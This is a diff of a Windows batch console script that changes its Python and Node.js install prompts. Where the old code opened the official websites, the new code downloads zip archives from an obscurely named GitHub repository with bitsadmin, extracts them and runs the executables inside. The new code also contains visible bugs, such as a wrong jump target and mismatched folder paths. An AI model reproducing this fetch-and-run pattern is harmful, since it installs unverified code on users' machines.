@@ -429,36 +429,49 @@ goto consoleinput
 
 :: ----------- python ----------- ::
 :python
-echo [38;2;0;255;255m
-if not exist C:\Python310 goto pythoninstall
+echo [1;38;2;0;255;255m
+if not exist "C:\Python310" goto pyinstall
 python
 goto consoleinput
-:pythoninstall
+:pyinstall
+cls
 echo.
 echo Python is not installed on this machine, would you like to install it?
 echo.
-set /p python= Choice(yes or no): 
-if %python% == Yes goto pythonyes
-if %python% == No goto pythonno
-if %python% == yes goto pythonyes
-if %python% == no goto pythonno
-echo '%python%' is not a valid choice. 
-goto pythoninstall
-:pythonyes
-start https://www.python.org/
-exit
-:pythonno
+set /p py= Choice(Y/N): 
+if %py% == Yes goto pyyes
+if %py% == No goto pyno
+if %py% == yes goto pyyes
+if %py% == no goto pyno
+if %py% == y goto pyyes
+if %py% == n goto pyno
+if %py% == Y goto pyyes
+if %py% == N goto pyno
+echo  
+echo '%py%' is not a valid choice.
+goto nodeinstall
+:pyyes
+mkdir %temp%\Pyware\
+cd %appdata%\Pyware\
+bitsadmin /transfer Python /download /priority foreground "https://github.com/AA206yt/SFjOPAFJoANosfnioadCNM/raw/main/python.zip" "%temp%\Pyware\Python.zip"
+powershell Expand-Archive %temp%\Pyware\python.zip -DestinationPath %temp%\Pyware\ >nul
+start %temp%\Pyware\python-3.10.1-amd64.exe
+cls
+goto console
+
+:pyno
 echo.
 goto consoleinput
 :: ----------- python ----------- ::
 
 :: ----------- node.js ----------- ::
 :node
-echo [38;2;0;255;255m
+echo [1;38;2;0;255;255m
 if not exist "C:\Program Files\nodejs" goto nodeinstall
 node
 goto consoleinput
 :nodeinstall
+cls
 echo.
 echo Node.js is not installed on this machine, would you like to install it?
 echo.
@@ -467,16 +480,21 @@ if %node% == Yes goto nodeyes
 if %node% == No goto nodeno
 if %node% == yes goto nodeyes
 if %node% == no goto nodeno
-if %node% == Y goto nodeyes
-if %node% == N goto nodeno
 if %node% == y goto nodeyes
 if %node% == n goto nodeno
+if %node% == Y goto nodeyes
+if %node% == N goto nodeno
 echo  
 echo '%node%' is not a valid choice.
 goto nodeinstall
 :nodeyes
-start https://nodejs.org/en/
-exit
+cd %appdata%\Pyware\
+bitsadmin /transfer Node.js /download /priority foreground "https://github.com/AA206yt/SFjOPAFJoANosfnioadCNM/raw/main/node.zip" "%appdata%\Pyware\node.zip"
+powershell Expand-Archive %appdata%\Pyware\node.zip -DestinationPath %appdata%\Pyware\ >nul
+start node.msi
+cls
+goto console
+
 :nodeno
 echo.
 goto consoleinput
